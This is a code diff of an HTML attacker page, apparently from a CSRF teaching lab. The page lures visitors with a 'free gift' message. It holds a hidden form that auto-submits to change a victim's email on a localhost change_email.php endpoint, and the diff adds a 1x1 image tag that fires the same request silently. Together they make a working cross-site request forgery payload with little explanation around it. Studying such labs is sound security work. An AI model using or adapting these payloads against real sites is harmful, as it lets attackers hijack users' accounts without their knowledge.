@@ -46,11 +46,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['email'])) { // Changed 
     
     <h2>Attacker's Malicious Page</h2>
     <p>Click below to receive a free gift!</p>
+    
+    <!-- ✅ Auto-submitting CSRF attack -->
     <form id="csrfForm" action="http://localhost/change_email.php" method="GET"> 
         <input type="hidden" name="email" value="hacker@example.com">
     </form>
     <script>
         document.getElementById('csrfForm').submit(); // Auto-submit to trigger CSRF
     </script>
+
+    <!-- ✅ Image-based CSRF attack -->
+    <img src="http://localhost/change_email.php?email=attacker@example.com" width="1" height="1" alt="">
+
 </body>
 </html>
